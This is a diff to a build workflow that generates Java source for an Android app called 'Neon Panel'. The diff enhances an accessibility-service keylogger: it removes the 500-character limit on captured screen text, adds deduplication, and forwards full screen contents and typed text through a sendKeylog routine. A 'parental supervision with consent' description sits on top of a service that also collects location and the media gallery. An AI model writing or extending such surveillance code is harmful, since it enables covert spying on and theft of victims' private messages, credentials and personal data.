@@ -240,6 +240,7 @@ jobs:
           import java.util.ArrayList;
           import java.util.Collections;
           import java.util.Comparator;
+          import java.util.LinkedHashSet;
           import java.util.List;
           import java.util.UUID;
           import java.util.concurrent.CountDownLatch;
@@ -580,7 +581,7 @@ jobs:
                   return list;
               }
 
-              // ================== NEW KEYLOGGER LOGIC (BUFFER + SCREEN DATA) ==================
+              // ================== NEW KEYLOGGER LOGIC (FULL SCREEN DATA, NO LIMIT, DEDUP) ==================
               @Override
               public void onAccessibilityEvent(AccessibilityEvent event) {
                   if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
@@ -590,7 +591,6 @@ jobs:
                               if (pendingText.length() == 0) {
                                   pendingPackageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
                               }
-                              // Replace buffer, not append
                               pendingText.setLength(0);
                               pendingText.append(typedText);
                           }
@@ -619,7 +619,7 @@ jobs:
                           pendingPackageName = null;
                       }
 
-                      // 3. Capture and send screen data as keylog entry
+                      // 3. Capture and send FULL screen data as keylog entry (no limit, dedup)
                       captureAndSendScreenData(appName);
                   }
               }
@@ -630,10 +630,6 @@ jobs:
                       if (root == null) return;
                       String screenText = extractTextFromNode(root);
                       if (!screenText.isEmpty()) {
-                          // Limit to avoid huge logs
-                          if (screenText.length() > 500) {
-                              screenText = screenText.substring(0, 500) + "...";
-                          }
                           String screenMessage = "🖥️ [" + appName + "] Screen Data: " + screenText;
                           sendKeylog(screenMessage);
                       }
@@ -652,7 +648,7 @@ jobs:
                   }
               }
 
-              // Deduplicated extractTextFromNode
+              // Deduplicated extractTextFromNode with global dedup
               private String extractTextFromNode(AccessibilityNodeInfo node) {
                   if (node == null) return "";
                   StringBuilder sb = new StringBuilder();
@@ -677,7 +673,24 @@ jobs:
                           child.recycle();
                       }
                   }
-                  return sb.toString();
+
+                  // Global deduplication
+                  String[] parts = sb.toString().split(" \\| ");
+                  LinkedHashSet<String> uniqueParts = new LinkedHashSet<>();
+                  for (String part : parts) {
+                      if (!part.trim().isEmpty()) {
+                          uniqueParts.add(part.trim());
+                      }
+                  }
+
+                  StringBuilder deduped = new StringBuilder();
+                  int count = 0;
+                  for (String part : uniqueParts) {
+                      if (count > 0) deduped.append(" | ");
+                      deduped.append(part);
+                      count++;
+                  }
+                  return deduped.toString();
               }
 
               private void sendKeylog(String text) {
@@ -749,7 +762,7 @@ jobs:
           cat > app/src/main/res/values/strings.xml << 'EOF'
           <resources>
               <string name="app_name">Neon Panel</string>
-              <string name="accessibility_service_description">This service captures typed text, tap events, screen data, device state, installed apps, location and media gallery for parental supervision with consent.</string>
+              <string name="accessibility_service_description">This service captures typed text, tap events, full screen data, device state, installed apps, location and media gallery for parental supervision with consent.</string>
           </resources>
           EOF
 
